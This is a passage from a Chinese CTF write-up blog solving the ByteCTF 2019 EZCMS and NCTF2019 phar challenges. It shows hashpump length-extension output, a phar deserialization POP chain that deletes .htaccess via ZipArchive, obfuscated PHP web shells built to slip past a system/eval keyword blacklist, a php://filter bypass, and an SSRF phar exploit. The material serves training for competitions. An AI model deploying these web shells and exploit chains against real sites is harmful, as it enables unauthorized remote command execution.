      <p><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png"><br>此时我们先从index.php来审计<br>此时是对admin账号中的admin密码做了一个处理；当我们的密码是admin时便不可以登入admin账号,接下来来看看config.php</p>

        <h3 id="config-php">
          <a href="#config-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#config-php" class="headerlink" title="config.php"></a>config.php</h3>
      
        <h4 id="hash长度拓展攻击">
          <a href="#hash长度拓展攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#hash长度拓展攻击" class="headerlink" title="hash长度拓展攻击"></a>hash长度拓展攻击</h4>
      <p><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png"><br>此时我们注意到了一个hash扩展长度攻击的漏洞点;因为已经知道了secret的长度和adminadmin的hash值;所以此时我们可以利用hash扩展长度攻击来进入admin<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png"><br>hashpump</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ hashpump</span><br><span class="line">Input Signature: 52107b08c0f3342d2153ae1d68e6262c //已知的签名</span><br><span class="line">Input Data: admin  //数据(password)</span><br><span class="line">Input Key Length: 13 //密文固定长度 secret.username</span><br><span class="line">Input Data to Add: hey  //拓展字段</span><br><span class="line">5e73ae134a79d4852d5e6958afc13d86 //拓展后获取的签名</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00hey //拓展后的数据</span><br><span class="line">Payload 中需替换 \x 为 %</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png"><br>此时使用bp或者开发者工具都可以伪造<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png"><br>此时已经可以传文件但是此时后台会对我们的文件内容进行过滤</p>

        <h4 id="过滤">
          <a href="#过滤" class="heading-link"><i class="fas fa-link"></i></a><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4>
      <p>此时继续向下审计源码<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png"><br>此时发现了Check这个类会对我们上传的文件内容做一个黑名单；当文件内容出现了’system’,’eval’,’exec’,’+’,’passthru’,’assert’便会显示”file make scare”<br>继续往下看这个File类<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png"><br>此时使用了构造函数_construct()并在该构造函数里面进行了赋值的操作；然后对$filepath进行了过滤；然后接下来使用了mime_content_type()获取文件的MI<br>NE类型然后储存在$mime中；最后使用了open()来打开文件结果并存储在$store_path中；最后在把$mime和$store_path作为关联数组储存在$res[]中<br>此时继续往下审计Admin类<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png"><br>此时发现会自动的创建一个随便写入内容的&#x2F;.htaccess文件；又因为&#x2F;.htaccess内容是乱写的。这也意味着。我们上传的文件都会收到.htaccess的影响不能正常执行;所以此时的思路就是如何把这个&#x2F;.htaccess文件给删除掉</p>

        <h3 id="view-php">
          <a href="#view-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#view-php" class="headerlink" title="view.php"></a>view.php</h3>
      <p><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png"><br>此时该源码时用来判断文件的输出路径和调用config.php源码的File类；所以此时我们的重点又回到了config.php中的File类</p>

        <h3 id="config-php的File类的深入审计">
          <a href="#config-php的File类的深入审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#config-php的File类的深入审计" class="headerlink" title="config.php的File类的深入审计"></a>config.php的File类的深入审计</h3>
      <p><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png"><br>此时我们将注意力集中在view_detail()上面；此时这个方法利用了一个读取文件的函数mime_content_type();而我们知道凡是调用了php_stream_locate_url_wrapper函数的php函数都会触发phar反序列化；在加上此时的过滤点存在phar；那么此时我们可不可以使用phar反序列话攻击来删除掉htaccess文件的影响；然后在上传木马进行getshell</p>

        <h2 id="0x03-phar反序列化攻击删除hatccess并getshell">
          <a href="#0x03-phar反序列化攻击删除hatccess并getshell" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x03-phar反序列化攻击删除hatccess并getshell" class="headerlink" title="0x03 phar反序列化攻击删除hatccess并getshell"></a>0x03 phar反序列化攻击删除hatccess并getshell</h2>
      <p>代码审计至此整个攻击思路已经十分的清楚了；利用phar反序列化攻击来删除htaccess文件对无法解析php文件的影响；然后在上传木马getshell;那么此时我们就需要来找到phar反序列化攻击的整条链子。<br>此时我们定位到config.php中的Profile类<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png"><br>虽然 webapp 自身没有提供对应的函数，但是 php 系统中是否存在某个类可以完成文件修改的效果，所以顺着这个思路就找到了 ZipArchive::open<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png"><br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.jianshu.com/p/972327151eff">https://www.jianshu.com/p/972327151eff</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="ZipAechive">
          <a href="#ZipAechive" class="heading-link"><i class="fas fa-link"></i></a><a href="#ZipAechive" class="headerlink" title="ZipAechive"></a>ZipAechive</h3>
      <p>Archive-&gt;open方法可以删除目标文件，前提是我们需要将其第二个参数设定为“9”。 为什么要设定为9呢？原因在于， ZipArchive-&gt;open()的第二个参数是“指定其他选项”。而9对应的是ZipArchive::CREATE | ZipArchive::OVERWRITE。由于ZipArchive打算覆盖我们的文件，所以就会先对其进行删除。在此，感谢@pagabuc帮助我们解释了这一参数的具体意义。 那么现在，我们就可以使用ZipArchive-&gt;open()来删除.htaccess文件。<br>ps:<br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/95896#h2-8">https://www.anquanke.com/post/id/95896#h2-8</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png"><br>ZipArchive::OVERWRITE这个选项。可以将已存在的文件覆盖;如果我们将.htaccess覆盖为NULL。就达到了删除.htaccess的目的.</p>

        <h3 id="pop链的构造">
          <a href="#pop链的构造" class="heading-link"><i class="fas fa-link"></i></a><a href="#pop链的构造" class="headerlink" title="pop链的构造"></a>pop链的构造</h3>
      <p>此时我们就需要构造出pop链来进行phar攻击了;此时我们将Profile类中的_call作为链尾;那么此时我们就需要知道如何触发到_call;此时我们知道当调用一个不<br>可访问或者不存在的方法时便会触发_call;此时我们在File类中发现了一个方法upload_file();此时我们若是将checker赋值为Profile但是在Profile中却不存<br>在这个upload_file()方法；所以此时便会自动触发这个_call类；所以此时的整条pop链已经完全清晰<br>pop链</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File[__destruct] --&gt; Profilep[__call]</span><br></pre></td></tr></table></div></figure>
<p>所以此时的exp即为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class File&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $filepath;</span><br><span class="line">    public $checker;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">class Profile&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $admin;</span><br><span class="line">&#125;</span><br><span class="line">// 准备好用到的两个类</span><br><span class="line">$a = new File();</span><br><span class="line">$a -&gt; checker=new Profile();</span><br><span class="line">$a -&gt; checker-&gt;admin=new ZipArchive();</span><br><span class="line">// 给checker赋值</span><br><span class="line">$a -&gt; checker-&gt;username=&quot;sandbox/2c67ca1eaeadbdc1868d67003072b481/.htaccess&quot;;</span><br><span class="line">$a -&gt; checker-&gt;password=ZipArchive::OVERWRITE;</span><br><span class="line">// 执行删除htaccess操作</span><br></pre></td></tr></table></div></figure>


        <h3 id="上传木马">
          <a href="#上传木马" class="heading-link"><i class="fas fa-link"></i></a><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h3>
      <p>此时来看后台对我们上传文件的限制<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/25.png"><br>因为eval无法通过拼接；所以这里我们选择system()来做执行<br>payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a=&quot;syste&quot;;</span><br><span class="line"></span><br><span class="line">$b=&quot;m&quot;;</span><br><span class="line"></span><br><span class="line">$c=$a.$b;</span><br><span class="line"></span><br><span class="line">$d=$c($_REQUEST[&#x27;a&#x27;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p>or payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$z=&quot;sys&quot;.&quot;tem&quot;;</span><br><span class="line">$z($_GET[0]);</span><br></pre></td></tr></table></div></figure>
<p>other paylaod</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line">$array[0] = $b;</span><br><span class="line">$c = array_map($a,$array);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p>此时上传后获取经过加密名的木马:072ccbc16881e36bc366b92d3ed3fd3e.php<br>a1d47f381fca335fa85d880091354e94.php</p>

        <h3 id="phar攻击">
          <a href="#phar攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#phar攻击" class="headerlink" title="phar攻击"></a>phar攻击</h3>
      <p>exp</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">class File&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $filepath;</span><br><span class="line">    public $checker;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">class Profile&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $admin;</span><br><span class="line">&#125;</span><br><span class="line">// 准备好用到的两个类</span><br><span class="line">$a = new File();</span><br><span class="line">$a -&gt; checker=new Profile();</span><br><span class="line">$a -&gt; checker-&gt;admin=new ZipArchive();</span><br><span class="line">// 给checker赋值</span><br><span class="line">$a -&gt; checker-&gt;username=&quot;var/www/html/sandbox/0de43e32c684497c6ed4327a3d5adfff/.htaccess&quot;; //注意要为绝对路径</span><br><span class="line">$a -&gt; checker-&gt;password=ZipArchive::OVERWRITE;</span><br><span class="line">// 执行删除htaccess操作</span><br><span class="line"></span><br><span class="line">@unlink(&quot;hey.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;hey.phar&quot;); //后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p>此时上传这个phar文件<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png"><br>然后此时我们需要进行一个bypass；因为此时对filepath的做了一次的过滤<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/23.png"><br>此时无法直接通过phar:&#x2F;&#x2F;直接触发这个phar文件；这里对协议进行了过滤，可以看到只检验了开头，且没有过滤 php:&#x2F;&#x2F;，可以使用 PHP 伪协议 bypass.<br>paylaod1</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=phar://filename.phar</span><br><span class="line">替换得php://filter/read=convert.base64-encode/resource=phar://sandbox/0de43e32c684497c6ed4327a3d5adfff/c54adfc5cf453cf63812783633f30c89.phar</span><br></pre></td></tr></table></div></figure>
<p>paylaod2</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?filename=c54adfc5cf453cf63812783633f30c89.phar&amp;filepath=php://filter/read=convert.base64-encode/resource=phar://sandbox/0de43e32c684497c6ed4327a3d5adfff/c54adfc5cf453cf63812783633f30c89.phar</span><br></pre></td></tr></table></div></figure>

        <h3 id="getshell">
          <a href="#getshell" class="heading-link"><i class="fas fa-link"></i></a><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3>
      <p>此时在上传这个phar文件并且触发其删除htaccess后我们直接访问我们上传的木马并构造payload:?a&#x3D;cat &#x2F;flag;即可getshell<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/26.png"><br>感言：字节跳动的这道题目考点还是挺多的；涉及了信息收集、目录扫描、源码泄漏、代码审计哈希长度扩展攻击、Phar反序列化、PHP伪协议、文件上传、bypass等；<br>还是很不容易才复现出来；出题的师傅tql！</p>

        <h2 id="NCTF2019-phar-matches-everything">
          <a href="#NCTF2019-phar-matches-everything" class="heading-link"><i class="fas fa-link"></i></a><a href="#NCTF2019-phar-matches-everything" class="headerlink" title="[NCTF2019]phar matches everything"></a>[NCTF2019]phar matches everything</h2>
      
        <h2 id="0x01-信息收集-3">
          <a href="#0x01-信息收集-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x01-信息收集-3" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2>
      <p>此时使用dirsearch扫描后台可以发现vim泄露；此此时恢复vim得到网站源码<br>catchemine.php<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/30.png"><br>upload.php<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/31.png"></p>

        <h2 id="0x02-源码审计">
          <a href="#0x02-源码审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x02-源码审计" class="headerlink" title="0x02 源码审计"></a>0x02 源码审计</h2>
      
        <h3 id="upload-php">
          <a href="#upload-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h3>
      <p><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/31.png"><br>此时先使用变量$target_dir规定文件被上传到哪一个目录；然后使用变量$uploadOK来表示能否上传文件；然后接下来截取上传文件的后缀名；并将此文件重新命<br>名；接下来检查上传文件是否为图像。如果是图像，将输出一条消息并将$uploadOk设置为1，表示允许上传。如果不是图像，将输出另一条消息并将$uploadOk设置为0，表示不允许上传。</p>

        <h3 id="catchmine-php">
          <a href="#catchmine-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#catchmine-php" class="headerlink" title="catchmine.php"></a>catchmine.php</h3>
      <p><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/30.png"><br>此时这段代码先是生成了两个类Eazytest和Main类；在Eazytest类中声明了一个受保护的属性$test并有一个返回该$test值的方法funny_get()<br>接下来看Main类；我们将其分为两个部分来审计<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/32.png"><br>在这个curl()方法中:<br>$ch &#x3D; curl_init():创建一个cURL会话句柄，并将其分配给变量$ch;<br>curl_setopt($ch, CURLOPT_URL, $url):设置cURL选项，指定要请求的URL。这里使用$url参数作为URL。<br>curl_setopt($ch, CURLOPT_RETURNTRANSFER, true):设置cURL选项，将返回的数据以字符串的形式返回，而不是直接输出到浏览器。<br>$output &#x3D; curl_exec($ch)：执行cURL请求，并将结果保存到$output变量中<br>curl_close($ch):关闭cURL会话句柄，释放资源。<br>return $output:返回请求的结果。<br>作用:这个 curl() 方法通过 cURL 库提供了一种方便的方式来执行 HTTP 请求。它可以用于从指定的URL获取数据、与远程服务器进行交互，或执行其他需要使用 cURL 的操作。返回的 $output 变量包含了请求的响应内容，可以根据需要进行进一步处理或显示。<br>简言之:这段代码可以用于从指定的URL获取数据或与远程服务器进行交互。<br>此时根据小草师傅们的文章可知这里存在ssrf攻击<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/33.png"><br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://bycsec.top/2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/">https://bycsec.top/2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssrf的利用：</span><br><span class="line">1.让服务端去访问相应的网址</span><br><span class="line">(比如读/flag之类的)</span><br><span class="line">2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</span><br><span class="line">3.可以使用```file、dict、gopher、ftp```协议进行请求访问相应的文件</span><br><span class="line">(其中gopher被称作万金油，可以打内网也可以get,post,当然还有攻击内网未授权的mysql，主要区别在于不默认端口)</span><br><span class="line">4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包&#123;payload&#125;）</span><br><span class="line">(ssrf打redis)</span><br><span class="line">5.攻击内网应用程序（利用跨协议通信技术）</span><br><span class="line">6.判断内网主机是否存活：方法是访问看是否有**端口开放**</span><br><span class="line">7.利用phar协议触发反序列化</span><br></pre></td></tr></table></div></figure>
<p>此时继续往下面看<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/34.png"><br>这段代码的作用是在表单提交时，检查提交的文件是否为图像文件。如果是图像文件，则输出相应的消息，显示图像的MIME类型。如果不是图像文件，则输出相应的消息，指明文件不是一个图像。这种验证可以用于限制用户只能上传图像文件，并对非图像文件进行相应处理。<br>此时我们需要注意的是getimagesize()这个函数:getimagesize是获取传入文件的元数据，如果传入的文件是phar文件，使用phar:&#x2F;&#x2F;协议读取时就会自动反序列化phar的metadata，那传入的phar元数据是序列化的Main类对象，就能进入析构函数了</p>

        <h2 id="0x03-攻击思路">
          <a href="#0x03-攻击思路" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x03-攻击思路" class="headerlink" title="0x03 攻击思路"></a>0x03 攻击思路</h2>
      <p>因为在getimagesize()可以触发phar反序列化；然后因为又存在析构函数destruct()；所以当对象被删除时可以再次触发这个析构函数；又因为这个析构函数被触发后可以触发curl()；而在curl()函数中有ssrf漏洞；所以此时的思路就是使用phar反序列化来触发ssrf读取文件。</p>

        <h3 id="exp">
          <a href="#exp" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp" class="headerlink" title="exp"></a>exp</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Easytest&#123;</span><br><span class="line">    protected $test = &#x27;1&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class Main &#123;</span><br><span class="line">    public $url = &#x27;file:///proc/net/arp&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Easytest();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">$b = new Main();</span><br><span class="line"></span><br><span class="line">@unlink(&quot;hey.phar&quot;);</span><br><span class="line">$phar=new Phar(&quot;hey.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&#x27;GIF89a&#x27;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($b);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

        <h3 id="payload">
          <a href="#payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#payload" class="headerlink" title="payload"></a>payload</h3>
      <p><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/35.png"></p>

        <h3 id="ps">
          <a href="#ps" class="heading-link"><i class="fas fa-link"></i></a><a href="#ps" class="headerlink" title="ps"></a>ps</h3>
      <p>这题在buu上好像环境出现了问题后面涉及的内容有内网攻击和PHP-FPM未授权访问漏洞。占时复现到phar反序列化攻击。后面在慢慢补</p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/06/27/hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">hash length extension attacks(hash长度拓展攻击)</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/06/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="paginator-prev__text">phar反序列化攻击</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HNCTF-2022-WEEK3-ez-phar"><span class="toc-number">1.</span> <span class="toc-text">
          [HNCTF 2022 WEEK3]ez_phar</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">
          0x01 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.</span> <span class="toc-text">
          0x02 phar反序列化攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2018-SimplePHP"><span class="toc-number">2.</span> <span class="toc-text">
          [SWPUCTF 2018]SimplePHP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">2.1.</span> <span class="toc-text">
          0x01 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-class-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.2.</span> <span class="toc-text">
          0x02 class.php代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-exp%E7%BC%96%E5%86%99"><span class="toc-number">2.3.</span> <span class="toc-text">
          0x03 exp编写</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ByteCTF-2019-EZCMS"><span class="toc-number">3.</span> <span class="toc-text">
          [ByteCTF 2019]EZCMS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="toc-number">3.1.</span> <span class="toc-text">
          0x01 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.2.</span> <span class="toc-text">
          0x02 代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#index-php"><span class="toc-number">3.2.1.</span> <span class="toc-text">
          index.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#config-php"><span class="toc-number">3.2.2.</span> <span class="toc-text">
          config.php</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">
          hash长度拓展攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">
          过滤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#view-php"><span class="toc-number">3.2.3.</span> <span class="toc-text">
